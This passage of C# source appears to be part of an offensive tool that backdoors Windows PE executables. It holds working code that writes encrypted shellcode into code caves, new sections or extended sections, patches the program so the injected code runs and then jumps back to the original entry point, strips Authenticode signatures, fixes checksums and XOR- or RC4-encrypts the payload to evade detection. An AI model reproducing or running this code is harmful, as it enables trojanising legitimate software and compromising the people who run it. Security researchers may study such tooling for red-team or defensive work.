            buf.AddRange(new byte[] { 0x48, 0x8D, 0x35 });
            buf.AddRange(BitConverter.GetBytes(leaOffset));

            // mov ecx, shellcode_length
            buf.Add(0xB9);
            buf.AddRange(BitConverter.GetBytes(shellcodeLen));

            // xor_loop: xor byte [rsi], key
            buf.AddRange(new byte[] { 0x80, 0x36, xorKey });
            // inc rsi
            buf.AddRange(new byte[] { 0x48, 0xFF, 0xC6 });
            // dec ecx
            buf.AddRange(new byte[] { 0xFF, 0xC9 });
            // jnz xor_loop (-10 = 0xF6)
            buf.AddRange(new byte[] { 0x75, 0xF6 });

            return buf.ToArray();
        }
        else
        {
            // x86 decoder using CALL/POP for PIC
            //   jmp short get_addr    ; EB 09
            //   decode:
            //   pop esi               ; 5E
            //   xor ecx, ecx          ; 31 C9
            //   mov cx, length        ; 66 B9 XX XX
            //   xor_loop:
            //   xor byte [esi], key   ; 80 36 XX
            //   inc esi               ; 46
            //   loop xor_loop         ; E2 FB (-5)
            //   jmp short continue    ; EB XX (skip call)
            //   get_addr:
            //   call decode           ; E8 F2 FF FF FF
            // This is complex. For simplicity, skip x86 decoder for now.
            return Array.Empty<byte>();
        }
    }

    /// <summary>
    /// After placing the payload at a known RVA, patch the JMP at the end to go to the original entry point.
    /// When jmpOffsetHint >= 0, use it directly. Otherwise auto-detect from inline payload layout.
    /// </summary>
    private byte[] PatchPayloadJmpOffset(byte[] peData, ParsedPe pe, int payloadLen, uint payloadRva,
                                          int jmpOffsetHint = -1)
    {
        long payloadFileOffset = RvaToFileOffset(payloadRva, pe.Sections);
        int pos;

        if (jmpOffsetHint >= 0)
        {
            // Threaded payload: caller told us exactly where the E9 JMP is
            pos = jmpOffsetHint;
        }
        else
        {
            // Inline payload: calculate from known layout [save][decoder?][CALL][restore][JMP][shellcode]
            bool is64Bit = pe.Is64Bit;
            byte[] save = is64Bit ? X64SaveRegs : X86SaveRegs;
            byte[] restore = is64Bit ? X64RestoreRegs : X86RestoreRegs;

            pos = save.Length;

            // Skip decoder if present (check for LEA RSI opcode for x64: 48 8D 35)
            if (is64Bit && pos + 3 <= payloadLen &&
                peData[payloadFileOffset + pos] == 0x48 &&
                peData[payloadFileOffset + pos + 1] == 0x8D &&
                peData[payloadFileOffset + pos + 2] == 0x35)
            {
                pos += 22; // decoder size
            }

            pos += 5; // CALL instruction
            pos += restore.Length; // restore regs
        }

        // Verify E9 JMP opcode at expected position
        long jmpFileOffset = payloadFileOffset + pos;
        if (peData[jmpFileOffset] != 0xE9)
        {
            _logger.Warn($"Expected E9 (JMP) at payload offset {pos}, got 0x{peData[jmpFileOffset]:X2}");
            // Try to find E9 nearby
            for (int scan = pos - 2; scan <= pos + 2; scan++)
            {
                if (scan >= 0 && scan < payloadLen && peData[payloadFileOffset + scan] == 0xE9)
                {
                    pos = scan;
                    jmpFileOffset = payloadFileOffset + pos;
                    break;
                }
            }
        }

        // Calculate relative offset: target - (jmp_rva + 5)
        uint jmpRva = payloadRva + (uint)pos;
        int relOffset = (int)pe.AddressOfEntryPoint - (int)(jmpRva + 5);

        var output = peData.ToArray();
        BitConverter.GetBytes(relOffset).CopyTo(output, jmpFileOffset + 1);
        return output;
    }

    // ═════════════════════════════════════════════════════════════════════
    //  Injection Methods
    // ═════════════════════════════════════════════════════════════════════

    private (byte[] data, uint payloadRva) InjectCodeCave(byte[] peData, ParsedPe pe,
        byte[] payload, BackdoorResult result)
    {
        var caves = ScanForCaves(peData, pe, payload.Length);
        if (caves.Count == 0)
        {
            throw new InvalidOperationException(
                $"No code cave large enough for {payload.Length} byte payload. " +
                $"Try --method new-section instead.");
        }

        // Pick best cave: prefer executable sections, then largest
        var cave = caves
            .OrderByDescending(c => c.SectionIsExecutable)
            .ThenByDescending(c => c.Size)
            .First();

        _logger.Info($"Selected cave: {cave.SectionName} @ file:0x{cave.FileOffset:X} RVA:0x{cave.Rva:X} ({cave.Size} bytes)");
        result.Steps.Add($"Using code cave: {cave.SectionName} @ RVA 0x{cave.Rva:X} ({cave.Size} bytes, need {payload.Length})");

        var output = peData.ToArray();

        // Write payload into cave
        Array.Copy(payload, 0, output, cave.FileOffset, payload.Length);

        // Make section executable + readable if not already
        var section = pe.Sections[cave.SectionIndex];
        uint requiredFlags = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ;
        if ((section.Characteristics & requiredFlags) != requiredFlags)
        {
            uint newChars = section.Characteristics | requiredFlags | IMAGE_SCN_CNT_CODE;
            output = PatchSectionCharacteristics(output, section, newChars);
            result.Steps.Add($"Made {section.Name} section executable (0x{section.Characteristics:X8} → 0x{newChars:X8})");
        }

        return (output, cave.Rva);
    }

    private (byte[] data, uint payloadRva) InjectNewSection(byte[] peData, ParsedPe pe,
        byte[] payload, string sectionName, BackdoorResult result)
    {
        uint fileAlign = pe.FileAlignment;
        uint sectAlign = pe.SectionAlignment;

        // Check if there's room for a new section header
        long newHeaderOffset = pe.SectionHeadersFileOffset + pe.NumberOfSections * 40;
        long headerEnd = newHeaderOffset + 40;
        if (headerEnd > pe.SizeOfHeaders)
        {
            throw new InvalidOperationException(
                $"No room for new section header (headers end at 0x{pe.SizeOfHeaders:X}, " +
                $"need 0x{headerEnd:X}). Try --method code-cave.");
        }

        // Calculate new section layout
        var lastSect = pe.Sections.Last();
        uint newRva = AlignUp(lastSect.VirtualAddress + Math.Max(lastSect.VirtualSize, lastSect.RawSize), sectAlign);
        uint rawSize = AlignUp((uint)payload.Length, fileAlign);
        uint rawOffset = AlignUp(lastSect.RawAddress + lastSect.RawSize, fileAlign);

        // Extend file (must be at least as large as original to preserve overlay/signature data)
        int newFileSize = Math.Max(peData.Length, (int)(rawOffset + rawSize));
        var output = new byte[newFileSize];
        Array.Copy(peData, 0, output, 0, peData.Length);

        // Write payload
        Array.Copy(payload, 0, output, rawOffset, payload.Length);

        // Update NumberOfSections
        ushort newCount = (ushort)(pe.NumberOfSections + 1);
        BitConverter.GetBytes(newCount).CopyTo(output, pe.NumberOfSectionsFileOffset);

        // Update SizeOfImage
        uint newSizeOfImage = AlignUp(newRva + (uint)payload.Length, sectAlign);
        BitConverter.GetBytes(newSizeOfImage).CopyTo(output, pe.SizeOfImageFieldFileOffset);

        // Write section header
        using var ms = new MemoryStream(output);
        ms.Seek(newHeaderOffset, SeekOrigin.Begin);
        using var bw = new BinaryWriter(ms);

        var nameBytes = new byte[8];
        Encoding.ASCII.GetBytes(sectionName, 0, Math.Min(sectionName.Length, 8), nameBytes, 0);
        bw.Write(nameBytes);
        bw.Write((uint)payload.Length);      // VirtualSize
        bw.Write(newRva);                    // VirtualAddress
        bw.Write(rawSize);                   // SizeOfRawData
        bw.Write(rawOffset);                 // PointerToRawData
        bw.Write(0u);                        // PointerToRelocations
        bw.Write(0u);                        // PointerToLinenumbers
        bw.Write((ushort)0);                 // NumberOfRelocations
        bw.Write((ushort)0);                 // NumberOfLinenumbers
        bw.Write(IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_CODE);

        result.Steps.Add($"Added section '{sectionName}' at RVA 0x{newRva:X} (raw 0x{rawOffset:X}, {rawSize} bytes)");
        return (ms.ToArray(), newRva);
    }

    private (byte[] data, uint payloadRva) InjectSectionExtension(byte[] peData, ParsedPe pe,
        byte[] payload, BackdoorResult result)
    {
        // Find last section and extend it
        var lastSection = pe.Sections.Last();
        uint fileAlign = pe.FileAlignment;
        uint sectAlign = pe.SectionAlignment;

        uint originalRawEnd = lastSection.RawAddress + lastSection.RawSize;
        uint payloadOffset = originalRawEnd;
        uint newRawSize = AlignUp(lastSection.RawSize + (uint)payload.Length, fileAlign);
        uint newVirtSize = Math.Max(lastSection.VirtualSize, lastSection.RawSize) + (uint)payload.Length;

        // Extend file if needed
        int requiredSize = (int)(lastSection.RawAddress + newRawSize);
        byte[] output;
        if (requiredSize > peData.Length)
        {
            output = new byte[requiredSize];
            Array.Copy(peData, output, peData.Length);
        }
        else
        {
            output = peData.ToArray();
        }

        // Write payload
        Array.Copy(payload, 0, output, payloadOffset, payload.Length);

        // Calculate payload RVA
        uint payloadRva = lastSection.VirtualAddress + lastSection.RawSize;

        // Update section header: VirtualSize and RawSize
        // VirtualSize is at section header + 8, RawSize at + 16
        BitConverter.GetBytes(newVirtSize).CopyTo(output, lastSection.HeaderFileOffset + 8);
        BitConverter.GetBytes(newRawSize).CopyTo(output, lastSection.HeaderFileOffset + 16);

        // Make section executable if not already
        uint chars = lastSection.Characteristics | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_CODE;
        BitConverter.GetBytes(chars).CopyTo(output, lastSection.HeaderFileOffset + 36);

        // Update SizeOfImage
        uint newSizeOfImage = AlignUp(lastSection.VirtualAddress + newVirtSize, sectAlign);
        BitConverter.GetBytes(newSizeOfImage).CopyTo(output, pe.SizeOfImageFieldFileOffset);

        result.Steps.Add($"Extended {lastSection.Name} by {payload.Length} bytes (raw 0x{payloadOffset:X}, RVA 0x{payloadRva:X})");
        return (output, payloadRva);
    }

    // ═════════════════════════════════════════════════════════════════════
    //  Header Patching Helpers
    // ═════════════════════════════════════════════════════════════════════

    private byte[] PatchEntryPointField(byte[] peData, ParsedPe pe, uint newEntryPoint)
    {
        var output = peData.ToArray();
        BitConverter.GetBytes(newEntryPoint).CopyTo(output, pe.EntryPointFieldFileOffset);
        return output;
    }

    private byte[] PatchSectionCharacteristics(byte[] peData, SectionEntry section, uint newChars)
    {
        var output = peData.ToArray();
        // Characteristics is at section header + 36
        BitConverter.GetBytes(newChars).CopyTo(output, section.HeaderFileOffset + 36);
        return output;
    }

    private byte[] RemoveSignatureInternal(byte[] peData, ParsedPe pe)
    {
        var output = peData.ToArray();
        // Zero out Security data directory entry (RVA and Size)
        BitConverter.GetBytes(0u).CopyTo(output, pe.SecurityDirFileOffset);
        BitConverter.GetBytes(0u).CopyTo(output, pe.SecurityDirFileOffset + 4);
        return output;
    }

    /// <summary>
    /// Strip the Authenticode signature overlay data from the end of the file.
    /// The security data directory uses a raw file offset (not RVA),
    /// and the signature bytes sit after the last section.
    /// Truncating them avoids overlap with new-section / section-ext injection.
    /// </summary>
    private byte[] StripSignatureOverlay(byte[] peData, ParsedPe pe)
    {
        // Find where sections end (max of RawAddress + RawSize across all sections)
        uint lastSectionEnd = 0;
        foreach (var s in pe.Sections)
        {
            uint end = s.RawAddress + s.RawSize;
            if (end > lastSectionEnd) lastSectionEnd = end;
        }

        // Truncate file to end of last section (removes overlay/signature bytes)
        if (lastSectionEnd > 0 && lastSectionEnd < peData.Length)
        {
            var truncated = new byte[lastSectionEnd];
            Array.Copy(peData, 0, truncated, 0, (int)lastSectionEnd);

            // Zero the security directory entry in the truncated data
            BitConverter.GetBytes(0u).CopyTo(truncated, pe.SecurityDirFileOffset);
            BitConverter.GetBytes(0u).CopyTo(truncated, pe.SecurityDirFileOffset + 4);

            _logger.Info($"Stripped {peData.Length - lastSectionEnd} bytes of signature overlay");
            return truncated;
        }

        // No overlay to strip — just zero the directory entry
        var output = peData.ToArray();
        BitConverter.GetBytes(0u).CopyTo(output, pe.SecurityDirFileOffset);
        BitConverter.GetBytes(0u).CopyTo(output, pe.SecurityDirFileOffset + 4);
        return output;
    }

    private byte[] PatchSubsystemInternal(byte[] peData, ParsedPe pe)
    {
        var output = peData.ToArray();
        BitConverter.GetBytes(IMAGE_SUBSYSTEM_WINDOWS_GUI).CopyTo(output, pe.SubsystemFieldFileOffset);
        return output;
    }

    private byte[] RecalculateChecksum(byte[] peData, ParsedPe pe)
    {
        var output = peData.ToArray();

        // Zero out the current checksum
        BitConverter.GetBytes(0u).CopyTo(output, pe.ChecksumFieldFileOffset);

        // Calculate PE checksum (standard CheckSumMappedFile algorithm)
        long checksum = 0;
        int checksumOffset = (int)pe.ChecksumFieldFileOffset;

        for (int i = 0; i < output.Length; i += 2)
        {
            // Skip the checksum field itself
            if (i == checksumOffset || i == checksumOffset + 2)
                continue;

            ushort word;
            if (i + 1 < output.Length)
                word = BitConverter.ToUInt16(output, i);
            else
                word = output[i]; // Last byte if odd-length file

            checksum += word;
            // Fold carries
            checksum = (checksum & 0xFFFF) + (checksum >> 16);
        }

        // Final fold
        checksum = (checksum & 0xFFFF) + (checksum >> 16);
        checksum += output.Length;

        BitConverter.GetBytes((uint)checksum).CopyTo(output, pe.ChecksumFieldFileOffset);
        return output;
    }

    // ═════════════════════════════════════════════════════════════════════
    //  Encryption
    // ═════════════════════════════════════════════════════════════════════

    private byte[] EncryptPayload(byte[] data, PeBackdoorOptions options)
    {
        return options.Encryption switch
        {
            PayloadEncryption.Xor => XorEncrypt(data, options.XorKey),
            PayloadEncryption.Xor2 => Xor2Encrypt(data),
            PayloadEncryption.Rc4 => Rc4Encrypt(data, GenerateRc4Key()),
            _ => data
        };
    }

    private static byte[] XorEncrypt(byte[] data, byte key)
    {
        if (key == 0) key = 0x42; // Avoid null key
        var result = new byte[data.Length];
        for (int i = 0; i < data.Length; i++)
            result[i] = (byte)(data[i] ^ key);
        return result;
    }

    private static byte[] Xor2Encrypt(byte[] data)
    {
        var key = new byte[] { 0x42, 0x37 };
        var result = new byte[data.Length];
        for (int i = 0; i < data.Length; i++)
            result[i] = (byte)(data[i] ^ key[i % 2]);
        return result;
    }

    private static byte[] GenerateRc4Key()
    {
        var key = new byte[16];
        Random.Shared.NextBytes(key);
        return key;
    }

    private static byte[] Rc4Encrypt(byte[] data, byte[] key)
    {
        var s = new byte[256];
        for (int i = 0; i < 256; i++) s[i] = (byte)i;

        int j = 0;
        for (int i = 0; i < 256; i++)
        {
            j = (j + s[i] + key[i % key.Length]) & 255;
            (s[i], s[j]) = (s[j], s[i]);
        }

        var result = new byte[data.Length];
        int x = 0, y = 0;
        for (int i = 0; i < data.Length; i++)
        {
            x = (x + 1) & 255;
            y = (y + s[x]) & 255;
            (s[x], s[y]) = (s[y], s[x]);
            result[i] = (byte)(data[i] ^ s[(s[x] + s[y]) & 255]);
        }

        return result;
    }

    // ═════════════════════════════════════════════════════════════════════
    //  Validation
    // ═════════════════════════════════════════════════════════════════════

    private List<string> ValidateForInjection(ParsedPe pe, byte[] shellcode, PeBackdoorOptions options)
    {
        var issues = new List<string>();

        if (pe.IsDotNet)
            issues.Add("BLOCK: Target is a .NET assembly — binary injection will corrupt managed metadata");

        if (pe.AddressOfEntryPoint == 0)
            issues.Add("BLOCK: PE has no entry point (AddressOfEntryPoint = 0)");

        if (pe.NumberOfSections == 0)
            issues.Add("BLOCK: PE has no sections");

        if (pe.EntryPointCodeFileOffset <= 0 || pe.EntryPointCodeFileOffset >= int.MaxValue)
            issues.Add("BLOCK: Entry point does not map to a valid file offset");

        if (pe.HasSignature && !options.RemoveSignature)
            issues.Add("PE has a digital signature — it will become invalid after injection (use --remove-signature or it will be removed by default)");

        if (pe.IsDll && options.CarrierInvoke == CarrierInvoke.EntryPointHijack)
            issues.Add("Target is a DLL — entry point hijack modifies DllMain behavior");

        if (shellcode.Length > 1_000_000)
            issues.Add("Shellcode is very large (>1MB) — this may cause issues with code cave injection");

        if (options.Method == InjectionMethod.CodeCave)
        {
            // Quick check if any section has enough space
            bool hasCaves = pe.Sections.Any(s =>
                s.RawSize > 0 && s.RawSize >= (uint)shellcode.Length + 100);
            if (!hasCaves)
                issues.Add("No section appears large enough for code cave injection — consider --method new-section");
        }

        return issues;
    }

    // ═════════════════════════════════════════════════════════════════════
    //  Utility
    // ═════════════════════════════════════════════════════════════════════

    private static long RvaToFileOffset(uint rva, List<SectionEntry> sections)
    {
        foreach (var s in sections)
        {
            if (rva >= s.VirtualAddress && rva < s.VirtualAddress + Math.Max(s.VirtualSize, s.RawSize))
                return s.RawAddress + (rva - s.VirtualAddress);
        }
        // If RVA is in headers (before first section)
        if (sections.Count > 0 && rva < sections[0].VirtualAddress)
            return rva;
        return -1;
    }

    private static uint FileOffsetToRva(long fileOffset, List<SectionEntry> sections)
    {
        foreach (var s in sections)
        {
            if (fileOffset >= s.RawAddress && fileOffset < s.RawAddress + s.RawSize)
                return s.VirtualAddress + (uint)(fileOffset - s.RawAddress);
        }
        return 0;
    }

    private static uint AlignUp(uint value, uint alignment)
    {
        if (alignment == 0) return value;
        return (value + alignment - 1) & ~(alignment - 1);
    }

    private PeInfo ToPeInfo(ParsedPe pe, string filePath, long fileSize)
    {
        var info = new PeInfo
        {
            FilePath = filePath,
            FileSize = fileSize,
            Is64Bit = pe.Is64Bit,
            IsDll = pe.IsDll,
            IsDotNet = pe.IsDotNet,
            HasAslr = pe.HasAslr,
            HasSignature = pe.HasSignature,
            EntryPoint = pe.AddressOfEntryPoint,
            ImageBase = pe.ImageBase,
        };

        foreach (var s in pe.Sections)
        {
            info.Sections.Add(new PeSectionInfo
            {
                Name = s.Name,
                VirtualAddress = s.VirtualAddress,
                VirtualSize = s.VirtualSize,
                RawAddress = s.RawAddress,
                RawSize = s.RawSize,
                Characteristics = s.Characteristics,
            });
        }

        return info;
    }
}
